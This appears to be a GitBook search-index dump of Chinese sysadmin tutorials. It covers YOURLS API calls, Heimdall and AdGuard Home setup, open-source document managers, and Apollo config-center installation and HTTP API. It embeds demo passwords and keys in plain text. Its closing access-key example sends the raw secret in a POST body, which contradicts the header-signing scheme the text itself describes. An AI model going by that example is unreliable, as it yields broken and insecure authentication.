如果不指定format为json的话，默认是XML格式 2、POST请求 用python来发送POST请求测试 这里以form表单形式提交数据，所以不需要将POST的data转为json格式 POST请求的几种编码方式可以参考：https://www.cnblogs.com/android-it/p/9558751.html import requests, json url = \"http://10.0.0.101/yourls-api.php?\" data = {\"username\":\"wangxiaoyu\",\"password\":\"123456\",\"url\":\"http://www.baidu.com\",\"format\":\"json\",\"action\":\"shorturl\"} response = requests.post(url, data) print(json.loads(response.text)) 返回的信息为 { 'url': { 'keyword': 'q94nkx', 'url': 'http://www.baidu.com', 'title': '百度一下，你就知道', 'date': '2020-04-21 07:31:45', 'ip': '10.0.0.1' }, 'status': 'success', 'message': 'http://www.baidu.com 已保存为', 'title': '百度一下，你就知道', 'shorturl': 'http://10.0.0.101/q94nkx', 'statusCode': 200 } 3、使用token而不使用账号密码 YOURLS允许使用username和password参数（如果您的设置是私有的话）以老式的方式调用API 。如果您担心将自己的凭证发送出去，还可以使用秘密签名令牌进行API调用。 signature在API请求中使用参数。例： http://yoursite/yourls-api.php?signature=1002a612b4&action=... python示例 import requests, json url = \"http://10.0.0.101/yourls-api.php?\" data = {\"signature\":\"6962355501\",\"url\":\"http://www.baidu.com\",\"format\":\"json\",\"action\":\"shorturl\"} response = requests.post(url, data) print(json.loads(response.text)) 安装Sleeky主题，美化YOURLS YOURLS界面显得非常古老，风格挺老的，前几天在Github上看到一款YOURLS主题Sleeky，这篇文章分享下Sleeky主题的安装，希望对你有所帮助。 安装Sleeky主题 最新版Sleeky主题可前往Github下载：https://github.com/Flynntes/Sleeky/releases Sleeky主题主题包括两部分，一部分是YOURLS前端，另一部分是YOURLS后台管理。下载Sleeky主题主题后可看到有2个文件夹： sleeky-frontend: 前端主题 sleeky-backend：后端主题 将sleeky-frontend文件夹下的内容放到YOURLS站点根目录下即可，不需要额外的设置，直接访问YOURLS主界面即可看到效果。 将后端文件夹sleeky-backend放到YOURLS下的/user/plugins目录，并在YOURLS后台启用Sleeky主题插件，如下图。 旧的后台地址： 新的后台界面： Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 11:19:37 "},"doc/Open-Source-Software/通过Heimdall开源免费，搭建自己的网络书签.html":{"url":"doc/Open-Source-Software/通过Heimdall开源免费，搭建自己的网络书签.html","title":"通过Heimdall开源免费，搭建自己的网络书签","keywords":"","body":"通过Heimdall开源免费，搭建自己的网络书签 Heimdall 是一款网络书签仪表盘，它内置了超过 300 款网络服务图标，以及接通了部分服务的 API，可以实现一个非常漂亮的网络书签、内网门户页面。 Heimdall 开源地址：https://github.com/linuxserver/Heimdall Heimdall 官网：https://heimdall.site/ 安装方式 docker run -itd --name=heimdall \\ --restart always \\ -v /data/docker/heimdall:/config \\ -e PGID=1000 -e PUID=1000 \\ -p 8280:80 -p 8443:443 \\ linuxserver/heimdall 其中 -v 是挂载配置文件夹，-e 是设置运行用户权限，一般情况下默认即可，-p 是映射端口，可自定义。 然后就能直接在内网通过 ip:8443 访问了。当然也可以放在公网上使用，毕竟支持多用户，和朋友一起也很开心。 优点： 界面漂亮，但是测试新建application有报500的错误。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-Source-Software/AdGuard搭建去广告公共DNS.html":{"url":"doc/Open-Source-Software/AdGuard搭建去广告公共DNS.html","title":"AdGuard搭建去广告公共DNS","keywords":"","body":"AdGuard搭建去广告公共DNS AdGuard Home官方下载：https://github.com/AdguardTeam/AdGuardHome/releases 可根据自己的平台下载最新版本。CentOS 7 安装方法如下： #下载AdGuard Home wget https://github.com/AdguardTeam/AdGuardHome/releases/download/v0.108.0-b.4/AdGuardHome_linux_amd64.tar.gz 备用下载 wget http://js.funet8.com/centos_software/AdGuardHome_linux_amd64.tar.gz #解压 tar -zxvf AdGuardHome_linux_amd64.tar.gz #进入AdGuardHome目录 cd AdGuardHome #放行3000端口（AdGuardHome初始化需要使用） #firewalld放行3000端口 firewall-cmd --zone=public --add-port=3000/tcp --permanent firewall-cmd --reload #iptables放行3000端口 iptables -A INPUT -p tcp --dport 3000 -j ACCEPT service iptables save #启动AdGuard Home ./AdGuardHome 浏览器打开http://IP+3000,根据提示完成安装，首次初始化会要求设置账号、密码，下次登录需要使用。 配置方案 Router 此设置将自动覆盖连接到您的家庭路由器的所有设备，您不需要手动配置它们。 打开您的路由器配置界面。通常情况下，您可以通过浏览器访问地址（如 http://192.168.0.1/ 或 http://192.168.1.1 ）。打开后您可能需要输入密码以进入配置界面。如果您不记得密码，通常可以通过路由器上的重置按钮来重设密码。但是，请注意，如您进行此操作，您最可能会失去所有路由器的配置。如果您的路由器需要通过特定的应用进行这一操作，请将相关应用程序安装到您的手机或计算机上并使用它设置您的路由器。 找到路由器的 DHCP/DNS 设置页面。您会在 DNS 这一单词旁边找到两到三行允许输入的输入框，每一行输入框分为四组，每组允许输入一到三个数字。 请在此处输入您的 AdGuard Home 服务器地址。 在某些类型的路由器上无法设置自定义 DNS 服务器。在此情况下将 AdGuard Home 设置为 DHCP 服务器，可能会有所帮助。否则您应该查找如何根据特定路由器型号设置 DNS 服务器的使用手册。 Windows 通过开始菜单或 Windows 搜索功能打开控制面板。 点击进入 ”网络和 Internet“ 后，再次点击进入 “网络和共享中心” 在窗口的左侧点击「更改适配器设置」。 选择您正在连接的网络设备，右击它并选择「属性”」。 在列表中找到 ”Internet 协议版本 4 (TCP/IPv4)“ ，选择并再次点击 ”属性“ 。 选择“使用下面的 DNS 服务器地址”，并输入您的 AdGuard Home 服务器地址。 Android 在安卓主屏幕菜单中点击设置。 点击菜单上的 ”无线局域网“ 选项。在屏幕上将列出所有可用的网络（蜂窝移动网络不支持修改 DNS ）。 长按当前已连接的网络，然后点击 ”修改网络设置“ 。 在某些设备上，您可能需要选中 ”高级“ 复选框以查看进一步的设置。您可能需要调整您安卓设备的 DNS 设置，或是需要将 IP 设置从 DHCP 切换到静态。 将 DNS 1 和 DNS 2 的值改为您的 AdGuard Home 服务器地址。 额外设置 为了方便管理，可以继续输入命令 ./AdGuardHome -s install 安装为服务，然后就可以使用下面的命令来进行管理了。 #启动 systemctl start AdGuardHome #开机自启 systemctl enable AdGuardHome #重启 systemctl restart AdGuardHome #停止 systemctl stop AdGuardHome DNS默认使用53(TCP/UDP)端口进行通信，因此别忘记放行53端口，否则DNS无法正常使用。如果安装了宝塔面板，可在面板内操作。 #firewalld放行53端口 firewall-cmd --zone=public --add-port=53/tcp --permanent firewall-cmd --zone=public --add-port=53/udp --permanent firewall-cmd --reload #iptables放行53端口 iptables -A INPUT -p tcp --dport 53 -j ACCEPT iptables -A INPUT -p udp --dport 53 -j ACCEPT service iptables save 参考： https://www.ixigua.com/6841132261996233223 https://www.ceer.cc/39 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-Source-Software/开源文档管理系统.html":{"url":"doc/Open-Source-Software/开源文档管理系统.html","title":"开源文档管理系统汇总","keywords":"","body":"开源文档管理系统汇总-再也不用担心找不到文档了 本文旨在汇总优秀的开源文档管理系统，以便大家需要在服务器上搭建知识库时选用适合自己的一款，官网一般就是演示站，搭建后默认的效果就是和官网一样。 MinDoc 官网：https://www.iminho.me 开源：https://github.com/lifei6671/mindoc Github的STAR数： 5k MinDoc 是一款针对IT团队开发的简单好用的文档管理系统。 MinDoc 的前身是 SmartWiki 文档系统。SmartWiki 是基于 PHP 框架 laravel 开发的一款文档管理系统。因 PHP 的部署对普通用户来说太复杂，所以改用 Golang 开发。可以方便用户部署和实用，同时增加Markdown和HTML两种编辑器。 BookStack BookStack 官网： https://www.bookstack.cn Gitee 开源: https://gitee.com/truthhun/BookStack GitHub开源: https://github.com/truthhun/BookStack Github的STAR数： 2.3k 开源免费，适合搭建文库，基于MinDoc，使用Beego开发的在线文档管理系统，功能类似Gitbook和看云 docsify 官网：https://docsify.js.org/#/zh-cn/ 开源：https://github.com/docsifyjs/docsify https://www.cnblogs.com/throwable/p/13605289.html Github的STAR数： 17.9k 免费开源，轻量级文档网站，界面简洁优雅，目前很多开源项目的文档都选用这个系统搭建 docsify 可以快速帮你生成文档网站。不同于 GitBook、Hexo 的地方是它不会生成静态的 .html 文件，所有转换工作都是在运行时。如果你想要开始使用它，只需要创建一个 index.html 就可以开始编写文档并直接部署在 GitHub Pages。 amWiki 官网：http://amwiki.org 开源：https://github.com/tevinli/amWiki 演示：http://amwiki.org/doc/ Github的STAR数： 826 amWiki 是一款由 JS 开发、依赖 Atom 或 Nodejs-Npm 的 Markdown 轻量级前端化开源文库系统。 amWiki 致力于让大家可以更简单、更便捷的建设个人和团队文库系统！ Docute 官网：https://docute.org 开源：https://github.com/egoist/docute Github的STAR数： 3.5k 开源免费，恐怕没有比它更简单的文档界面了，很适合做产品的开发文档 showdoc 官网： https://www.showdoc.com.cn/ 开源：https://github.com/star7th/showdoc Github的STAR数： 9.1k ShowDoc是一个非常适合IT团队的在线API文档、技术文档工具。通过showdoc，你可以方便地使用markdown语法来书写出美观的API文档、数据字典文档、技术文档、在线excel文档等等。 Kooteam 官网（打不开）： https://www.kooteam.com/ 开源： https://gitee.com/sinbo/kooteam Gitee的STAR数： 1.1k kooteam是一款轻量级的在线团队协作工具，提供各类文档工具、在线思维导图、在线流程图、项目管理、任务分发，知识库管理等工具。 官方网站已无法打开。 部署文档：https://www.yundashi168.com/174.html Wizard 开源： https://gitee.com/orionis/wizard Github:https://github.com/mylxsw/wizard Github的STAR数： 1.6k Wizard是一款开源文档管理系统，目前支持三种类型的文档管理 Markdown：也是Wizard最主要的文档类型，研发团队日常工作中交流所采用的最常用文档类型，在 Wizard 中，对 Editor.md 项目进行了功能扩展，增加了文档模板，Json 转表格，图片粘贴上传等功能 Swagger：支持 OpenAPI 3.0 规范，集成了 Swagger 官方的编辑器，支持文档模板，全屏编辑，文档自动同步功能 Table：这种文档类型是类似于 Excel 电子表格，集成了 x-spreadsheet 项目 项目采用了 Laravel 开发框架开发 优点：支持docker安装，采用docker安装相对简单 蚂蚁笔记 官网： https://leanote.com/ 开源： https://github.com/leanote/leanote Github的STAR数： 10.1k Leanote的客户端做的也是相当贴心和完善了, 在登录界面最底部点击使用自定义服务器。 为知笔记 官网： https://www.wiz.cn/zh-cn 知笔记服务端docker镜像使用： https://www.wiz.cn/zh-cn/docker 不知是否是开源，但可以部署到自己的服务器中 5 用户以下免费使用，超出 5 用户，按照用户数的方式按年收取费用，授权价格：199 元/用户/年 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Apollo/readme.html":{"url":"doc/Apollo/readme.html","title":"开源软件-Apollo","keywords":"","body":"开源配置管理中心apollo Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 10:53:20 "},"doc/Apollo/1.基于Linux搭建开源配置管理中心apollo.html":{"url":"doc/Apollo/1.基于Linux搭建开源配置管理中心apollo.html","title":"基于Linux搭建开源配置管理中心apollo","keywords":"","body":"基于Linux搭建开源配置管理中心apollo 什么是apollo Apollo（阿波罗）是一款可靠的分布式配置管理中心，诞生于携程框架研发部，能够集中化管理应用不同环境、不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，适用于微服务配置管理场景。 应用什么场景 项目在不同环境对应的配置不同 Apollo优点 1.统一管理不同环境、不同集群的配置 Apollo提供了一个统一界面集中式管理不同环境（environment）、不同集群（cluster）、不同命名空间（namespace）的配置。 同一份代码部署在不同的集群，可以有不同的配置，比如zk的地址等 通过命名空间（namespace）可以很方便的支持多个不同应用共享同一份配置，同时还允许应用对共享的配置进行覆盖 2.配置修改实时生效（热发布） 用户在 Apollo 修改完配置并发布后，客户端能实时（1 秒）接收到最新的配置，并通知到应用程序。 3.版本发布管理 所有的配置发布都有版本概念，从而可以方便地支持配置的回滚。 4.灰度发布 支持配置的灰度发布，比如点了发布后，只对部分应用实例生效，等观察一段时间没问题后再推给所有应用实例。 5.权限管理、发布审核、操作审计 应用和配置的管理都有完善的权限管理机制，对配置的管理还分为了编辑和发布两个环节，从而减少人为的错误。所有的操作都有审计日志，可以方便地追踪问题。 6.客户端配置信息监控 可以在界面上方便地看到配置在被哪些实例使用。 7.提供 Java 和.Net 原生客户端，同时提供HTTP接口 提供了 Java 和.Net 的原生客户端，方便应用集成，同时提供了 Http 接口，非 Java 和.Net 应用也可以方便地使用。 go、python、nodejs、PHP等开发语言也提供客户端使用的案例，参考地址 8. 提供开放平台 API Apollo 自身提供了比较完善的统一配置管理界面，支持多环境、多数据中心配置管理、权限、流程治理等特性。不过 Apollo 出于通用性考虑，不会对配置的修改做过多限制，只要符合基本的格式就能保存，不会针对不同的配置值进行针对性的校验，如数据库用户名、密码，Redis 服务地址等。对于这类应用配置，Apollo 支持应用方通过开放平台 API 在 Apollo 进行配置的修改和发布，并且具备完善的授权和权限控制。 9.部署简单 配置中心作为基础服务，可用性要求非常高，这就要求 Apollo 对外部依赖尽可能地少，目前唯一的外部依赖是 MySQL，所以部署非常简单，只要安装好 Java 和 MySQL 就可以让 Apollo 跑起来。Apollo 还提供了打包脚本，一键就可以生成所有需要的安装包，并且支持自定义运行时参数。 测试系统介绍 系统 Centos7 java环境 java1.8 数据库 MariaDB-10.2.9 IP 192.168.1.5 Quick Start脚本会在本地启动3个服务，分别使用8070, 8080, 8090端口，请确保这3个端口当前没有被使用。 # java -version openjdk version \"1.8.0_302\" OpenJDK Runtime Environment (build 1.8.0_302-b08) OpenJDK 64-Bit Server VM (build 25.302-b08, mixed mode) # mysql -V mysql Ver 15.1 Distrib 10.2.9-MariaDB, for Linux (x86_64) using readline 5.1 安装apollo 下载Quick Start安装包 安装包共50M，如果访问github网速不给力的话，可以从百度网盘下载。 从GitHub下载 checkout或下载apollo-build-scripts项目 由于Quick Start项目比较大，所以放在了另外的repository，请注意项目地址 https://github.com/nobodyiam/apollo-build-scripts 从百度网盘下载 通过网盘链接下载，提取码: 9wwe 下载到本地后，在本地解压apollo-quick-start.zip 为啥安装包要58M这么大？ 因为这是一个可以自启动的jar包，里面包含了所有依赖jar包以及一个内置的tomcat容器 cd /data/wwwroot/web/ git clone https://github.com/apolloconfig/apollo-build-scripts.git 由于网络原因下载比较慢 wget http://js.funet8.com/centos_software/apollo-build-scripts-master.zip unzip apollo-build-scripts-master.zip mv apollo-build-scripts-master apollo.chuanqu.ltd cd apollo.chuanqu.ltd 创建数据库 # mysql -u root -h192.168.1.5 -P 3306 -p123456 # 导入数据 ApolloPortalDB > source /data/wwwroot/web/apollo.chuanqu.ltd/sql/apolloportaldb.sql # 验证 > select `Id`, `AppId`, `Name` from ApolloPortalDB.App; # 导入 ApolloConfigDB > source /data/wwwroot/web/apollo.chuanqu.ltd/sql/apolloconfigdb.sql > select `NamespaceId`, `Key`, `Value`, `Comment` from ApolloConfigDB.Item; 配置数据库连接信息 Apollo服务端需要知道如何连接到你前面创建的数据库，所以需要编辑demo.sh，修改ApolloPortalDB和ApolloConfigDB相关的数据库连接串信息。 注意：填入的用户需要具备对ApolloPortalDB和ApolloConfigDB数据的读写权限。 # vi demo.sh #apollo config db info apollo_config_db_url=\"jdbc:mysql://192.168.1.5:3306/ApolloConfigDB?characterEncoding=utf8&serverTimezone=Asia/Shanghai\" apollo_config_db_username=root apollo_config_db_password=123456 # apollo portal db info apollo_portal_db_url=\"jdbc:mysql://192.168.1.5:3306/ApolloPortalDB?characterEncoding=utf8&serverTimezone=Asia/Shanghai\" apollo_portal_db_username=root apollo_portal_db_password=123456 执行启动脚本 ./demo.sh start 显示 # ./demo.sh start ==== starting service ==== Service logging file is ./service/apollo-service.log Application is running as root (UID 0). This is considered insecure. Started [32028] Waiting for config service startup..... Config service started. You may visit http://localhost:8080 for service status now! Waiting for admin service startup. Admin service started ==== starting portal ==== Portal logging file is ./portal/apollo-portal.log Application is running as root (UID 0). This is considered insecure. Started [32251] Waiting for portal startup.... Portal started. You can visit http://localhost:8070 now! 访问8080端口 访问 http://IP+8070 输入用户名apollo，密码admin后登录 运行客户端程序 运行./demo.sh client启动Demo客户端，忽略前面的调试信息，可以看到如下提示： Apollo Config Demo. Please input key to get the value. Input quit to exit. 输入timeout，会看到如下信息： > timeout > [SimpleApolloConfigDemo] Loading key : timeout with value: 100 修改配置之后 > Changes for namespace application Change - key: timeout, oldValue: 100, newValue: 250, changeType: MODIFIED > timeout Loading key : timeout with value: 250 配置nginx反向代理 域名: apollo.chuanqu.ltd (接口) apollo-houtai.chuanqu.ltd (后台) server { listen 80; server_name apollo-houtai.chuanqu.ltd; #root /data/wwwroot/web/; access_log /data/wwwroot/log/apollo.chuanqu.ltd-access.log main_aliyun; error_log off; location / { index index.php index.html; proxy_pass http://192.168.1.5:8070; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } server { listen 80; server_name apollo.chuanqu.ltd; #root /data/wwwroot/web/; access_log /data/wwwroot/log/apollo.chuanqu.ltd-access.log main_aliyun; error_log off; location / { index index.php index.html; proxy_pass http://192.168.1.5:8080; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } 使用新的项目 应用接入Apollo 这部分可以参考Java应用接入指南 https://www.apolloconfig.com/#/zh/usage/java-sdk-user-guide 运行客户端程序 由于使用了新的项目，所以客户端需要修改appId信息。 编辑client/META-INF/app.properties，修改app.id为你新创建的app id。 app.id=你的appId 运行./demo.sh client启动Demo客户端即可。 创建应用 设置appid为 1001， 新增配置 设置，redis_ip和 value为192.168.1.12 点击发布 vim client/META-INF/app.properties 把app.id改成刚才新增的应用的ID app.id=1001 运行客户端，输入对应key值，看是否能获取到value值。 ./demo.sh client Apollo Config Demo. Please input key to get the value. Input quit to exit. > redis_ip Loading key : redis_ip with value: 192.168.1.12 > redis_passwd Loading key : redis_passwd with value: 123456 新增一个redis_port的KEY > Changes for namespace application Change - key: redis_port, oldValue: null, newValue: 6379, changeType: ADDED > redis_port Loading key : redis_port with value: 6379 基于Centos7搭建开源配置管理中心apollo，完成。 参考地址 官网文档 分布式部署指南 GitHub仓库 Gitee仓库 知乎：携程开源配置中心Apollo的设计与实现 携程Apollo的PHP客户端 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 11:05:04 "},"doc/Apollo/2.开源配置管理中心apollo使用方法.html":{"url":"doc/Apollo/2.开源配置管理中心apollo使用方法.html","title":"开源配置管理中心apollo使用方法","keywords":"","body":"开源配置管理中心apollo使用方法 什么是apollo Apollo（阿波罗）是一款可靠的分布式配置管理中心，诞生于携程框架研发部，能够集中化管理应用不同环境、不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，适用于微服务配置管理场景。 应用什么场景 项目在不同环境对应的不同的配置，统一管理不同环境、不同集群的配置 Apollo提供了一个统一界面集中式管理不同环境（environment）、不同集群（cluster）、不同命名空间（namespace）的配置。 同一份代码部署在不同的集群，可以有不同的配置，比如zk的地址等 通过命名空间（namespace）可以很方便的支持多个不同应用共享同一份配置，同时还允许应用对共享的配置进行覆盖 系统介绍 系统 Centos7 java环境 java1.8 数据库 MariaDB-10.2.9 IP 192.168.1.8 使用文档 名词解释 普通应用 普通应用指的是独立运行的程序，如Web应用程序、带有main函数的程序 公共组件 公共组件指的是发布的类库、客户端程序，不会自己独立运行，如Java的jar包、.Net的dll文件 普通应用接入指南 创建项目 要使用Apollo，第一步需要创建项目。 打开apollo-portal主页 点击“创建项目” 输入项目信息 部门：选择应用所在的部门 应用AppId：用来标识应用身份的唯一id，格式为string，需要和客户端app.properties中配置的app.id对应 应用名称：应用名，仅用于界面展示 应用负责人：选择的人默认会成为该项目的管理员，具备项目权限管理、集群创建、Namespace创建等权限 点击提交 创建成功后，会自动跳转到项目首页 项目权限分配 项目管理员权限 项目管理员拥有以下权限： 可以管理项目的权限分配 可以创建集群 可以创建Namespace 创建项目时填写的应用负责人默认会成为项目的管理员之一，如果还需要其他人也成为项目管理员，可以按照下面步骤操作： 点击页面左侧的“管理项目” 搜索需要添加的成员并点击添加 配置编辑、发布权限 配置权限分为编辑和发布： 编辑权限允许用户在Apollo界面上创建、修改、删除配置 配置修改后只在Apollo界面上变化，不会影响到应用实际使用的配置 发布权限允许用户在Apollo界面上发布、回滚配置 配置只有在发布、回滚动作后才会被应用实际使用到 Apollo在用户操作发布、回滚动作后实时通知到应用，并使最新配置生效 项目创建完，默认没有分配配置的编辑和发布权限，需要项目管理员进行授权。 点击application这个namespace的授权按钮 分配修改权限 分配发布权限 添加配置项 编辑配置需要拥有这个Namespace的编辑权限，如果发现没有新增配置按钮，可以找项目管理员授权。 通过表格模式添加配置 点击新增配置 输入配置项 点击提交 通过文本模式编辑 Apollo除了支持表格模式，逐个添加、修改配置外，还提供文本模式批量添加、修改。 这个对于从已有的properties文件迁移尤其有用。 切换到文本编辑模式 点击右侧的修改配置按钮 输入配置项，并点击提交修改 发布配置 配置只有在发布后才会真的被应用使用到，所以在编辑完配置后，需要发布配置。 发布配置需要拥有这个Namespace的发布权限，如果发现没有发布按钮，可以找项目管理员授权。 点击“发布按钮” 填写发布相关信息，点击发布 应用读取配置 配置发布成功后，应用就可以通过Apollo客户端读取到配置了。 Apollo目前提供Java客户端，具体信息请点击Java客户端使用文档： 如果应用使用了其它语言，也可以通过直接访问Http接口获取配置，具体可以参考其它语言客户端接入指南 应用接入Apollo 首先需要在Apollo中接入你的应用，具体步骤可以参考应用接入文档。 通过带缓存的Http接口从Apollo读取配置 该接口会从缓存中获取配置，适合频率较高的配置拉取请求，如简单的每30秒轮询一次配置。 由于缓存最多会有一秒的延时，所以如果需要配合配置推送通知实现实时更新配置的话，请参考通过不带缓存的Http接口从Apollo读取配置 Http接口说明 URL: {config_server_url}/configfiles/json/{appId}/{clusterName}/{namespaceName}?ip={clientIp} Method: GET 参数说明： 参数名 是否必须 参数值 备注 config_server_url 是 Apollo配置服务的地址 appId 是 应用的appId clusterName 是 集群名 一般情况下传入 default 即可。 如果希望配置按集群划分，可以参考集群独立配置说明做相关配置，然后在这里填入对应的集群名。 namespaceName 是 Namespace的名字 如果没有新建过Namespace的话，传入application即可。 如果创建了Namespace，并且需要使用该Namespace的配置，则传入对应的Namespace名字。需要注意的是对于properties类型的namespace，只需要传入namespace的名字即可，如application。对于其它类型的namespace，需要传入namespace的名字加上后缀名，如datasources.json ip 否 应用部署的机器ip 这个参数是可选的，用来实现灰度发布。 如果不想传这个参数，请注意URL中从?号开始的query parameters整个都不要出现。 Http接口返回格式 该Http接口返回的是JSON格式、UTF-8编码，包含了对应namespace中所有的配置项。 返回内容Sample如下： { \"portal.elastic.document.type\":\"biz\", \"portal.elastic.cluster.name\":\"hermes-es-fws\" } 通过{config_server_url}/configfiles/{appId}/{clusterName}/{namespaceName}?ip={clientIp}可以获取到properties形式的配置 测试 由于是Http接口，所以在URL组装OK之后，直接通过浏览器、或者相关的http接口测试工具访问即可。 本地测试： # curl http://192.168.1.5:8080/configfiles/json/1001/default/application {\"redis_ip\":\"192.168.1.12\",\"redis_passwd\":\"123456\",\"redis_port\":\"6379\"} 通过不带缓存的Http接口从Apollo读取配置 该接口会直接从数据库中获取配置，可以配合配置推送通知实现实时更新配置。 Http接口说明 URL: {config_server_url}/configs/{appId}/{clusterName}/{namespaceName}?releaseKey={releaseKey}&ip={clientIp} Method: GET 参数说明： 参数名 是否必须 参数值 备注 config_server_url 是 Apollo配置服务的地址 appId 是 应用的appId clusterName 是 集群名 一般情况下传入 default 即可。 如果希望配置按集群划分，可以参考集群独立配置说明做相关配置，然后在这里填入对应的集群名。 namespaceName 是 Namespace的名字 如果没有新建过Namespace的话，传入application即可。 如果创建了Namespace，并且需要使用该Namespace的配置，则传入对应的Namespace名字。需要注意的是对于properties类型的namespace，只需要传入namespace的名字即可，如application。对于其它类型的namespace，需要传入namespace的名字加上后缀名，如datasources.json releaseKey 否 上一次的releaseKey 将上一次返回对象中的releaseKey传入即可，用来给服务端比较版本，如果版本比下来没有变化，则服务端直接返回304以节省流量和运算 ip 否 应用部署的机器ip 这个参数是可选的，用来实现灰度发布。 Http接口返回格式 该Http接口返回的是JSON格式、UTF-8编码。 如果配置没有变化（传入的releaseKey和服务端的相等），则返回HttpStatus 304，response body为空。 如果配置有变化，则会返回HttpStatus 200，response body为对应namespace的meta信息以及其中所有的配置项。 返回内容Sample如下： { \"appId\": \"100004458\", \"cluster\": \"default\", \"namespaceName\": \"application\", \"configurations\": { \"portal.elastic.document.type\":\"biz\", \"portal.elastic.cluster.name\":\"hermes-es-fws\" }, \"releaseKey\": \"20170430092936-dee2d58e74515ff3\" } 测试 由于是Http接口，所以在URL组装OK之后，直接通过浏览器、或者相关的http接口测试工具访问即可。 本地测试 # curl http://192.168.1.5:8080/configs/1001/default/application {\"appId\":\"1001\",\"cluster\":\"default\",\"namespaceName\":\"application\",\"configurations\":{\"redis_ip\":\"192.168.1.12\",\"redis_passwd\":\"123456\",\"redis_port\":\"6379\"},\"releaseKey\":\"20220330100056-d3ee492df675126d\"} # curl http://192.168.1.5:8080/configs/1001/default/application?releaseKey=20220330100056-d3ee492df675126d 应用感知配置更新 Apollo提供了基于Http long polling的配置更新推送通知，第三方客户端可以看自己实际的需求决定是否需要使用这个功能。 如果对配置更新时间不是那么敏感的话，可以通过定时刷新来感知配置更新，刷新频率可以视应用自身情况来定，建议在30秒以上。 如果需要做到实时感知配置更新（1秒）的话，可以参考下面的文档实现配置更新推送的功能。 配置更新推送实现思路 这里建议大家可以参考Apollo的Java实现：RemoteConfigLongPollService.java，代码量200多行，总体上还是比较简单的。 初始化 首先需要确定哪些namespace需要配置更新推送，Apollo的实现方式是程序第一次获取某个namespace的配置时就会来注册一下，我们就知道有哪些namespace需要配置更新推送了。 初始化后的结果就是得到一个notifications的Map，内容是namespaceName -> notificationId（初始值为-1）。 运行过程中如果发现有新的namespace需要配置更新推送，直接塞到notifications这个Map里面即可。 请求服务 有了notifications这个Map之后，就可以请求服务了。这里先描述一下请求服务的逻辑，具体的URL参数和说明请参见后面的接口说明。 请求远端服务，带上自己的应用信息以及notifications信息 服务端针对传过来的每一个namespace和对应的notificationId，检查notificationId是否是最新的 如果都是最新的，则保持住请求60秒，如果60秒内没有配置变化，则返回HttpStatus 304。如果60秒内有配置变化，则返回对应namespace的最新notificationId, HttpStatus 200。 如果传过来的notifications信息中发现有notificationId比服务端老，则直接返回对应namespace的最新notificationId, HttpStatus 200。 客户端拿到服务端返回后，判断返回的HttpStatus 如果返回的HttpStatus是304，说明配置没有变化，重新执行第1步 如果返回的HttpStauts是200，说明配置有变化，针对变化的namespace重新去服务端拉取配置，参见1.3 通过不带缓存的Http接口从Apollo读取配置。同时更新notifications map中的notificationId。重新执行第1步。 Http接口说明 URL: {config_server_url}/notifications/v2?appId={appId}&cluster={clusterName}&notifications={notifications} Method: GET 参数说明： 参数名 是否必须 参数值 备注 config_server_url 是 Apollo配置服务的地址 appId 是 应用的appId clusterName 是 集群名 一般情况下传入 default 即可。 如果希望配置按集群划分，可以参考集群独立配置说明做相关配置，然后在这里填入对应的集群名。 notifications 是 notifications信息 传入本地的notifications信息，注意这里需要以array形式转为json传入，如：[{\"namespaceName\": \"application\", \"notificationId\": 100}, {\"namespaceName\": \"FX.apollo\", \"notificationId\": 200}]。需要注意的是对于properties类型的namespace，只需要传入namespace的名字即可，如application。对于其它类型的namespace，需要传入namespace的名字加上后缀名，如datasources.json 注1：由于服务端会hold住请求60秒，所以请确保客户端访问服务端的超时时间要大于60秒。 注2：别忘了对参数进行url encode Http接口返回格式 该Http接口返回的是JSON格式、UTF-8编码，包含了有变化的namespace和最新的notificationId。 返回内容Sample如下： [ { \"namespaceName\": \"application\", \"notificationId\": 101 } ] 测试 由于是Http接口，所以在URL组装OK之后，直接通过浏览器、或者相关的http接口测试工具访问即可。 配置访问密钥 Apollo从1.6.0版本开始增加访问密钥机制，从而只有经过身份验证的客户端才能访问敏感配置。如果应用开启了访问密钥，客户端发出请求时需要增加签名，否则无法获取配置。 需要设置的Header信息： Header Value 备注 Authorization Apollo ${appId}:${signature} appId: 应用的appId，signature：使用访问密钥对当前时间以及所访问的URL加签后的值，具体实现可以参考Signature.signature Timestamp 从1970-1-1 00:00:00 UTC+0到现在所经过的毫秒数 可以参考System.currentTimeMillis) 本地测试 # curl http://192.168.1.5:8080/configfiles/json/1001/default/application {\"timestamp\":\"2022-03-30T16:39:11.912+0800\",\"status\":401,\"error\":\"Unauthorized\",\"message\":\"\",\"path\":\"/configfiles/json/1001/default/application\"} 报错 401 密钥： da01f4aab45d4e3c8b8764d99f9a31f5 获取时间戳： Timestamp=`date +%s` curl http://192.168.1.5:8080/configfiles/json/1001/default/application -X POST -H \"Content-type:application/json\" -d '{\"Authorization\":\"Apollo 1001:da01f4aab45d4e3c8b8764d99f9a31f5\",\"Timestamp\":\"1648630422\"}' 错误码说明 正常情况下，接口返回的Http状态码是200，下面列举了Apollo会返回的非200错误码说明。 400 - Bad Request 客户端传入参数的错误，如必选参数没有传入等，客户端需要根据提示信息检查对应的参数是否正确。 401 - Unauthorized 客户端未授权，如服务端配置了访问密钥，客户端未配置或配置错误。 404 - Not Found 接口要访问的资源不存在，一般是URL或URL的参数错误，或者是对应的namespace还没有发布过配置。 405 - Method Not Allowed 接口访问的Method不正确，比如应该使用GET的接口使用了POST访问等，客户端需要检查接口访问方式是否正确。 500 - Internal Server Error 其它类型的错误默认都会返回500，对这类错误如果应用无法根据提示信息找到原因的话，可以尝试查看服务端日志来排查问题。 Apollo使用场景和示例代码 https://github.com/ctripcorp/apollo-use-cases Apollo 实践案例 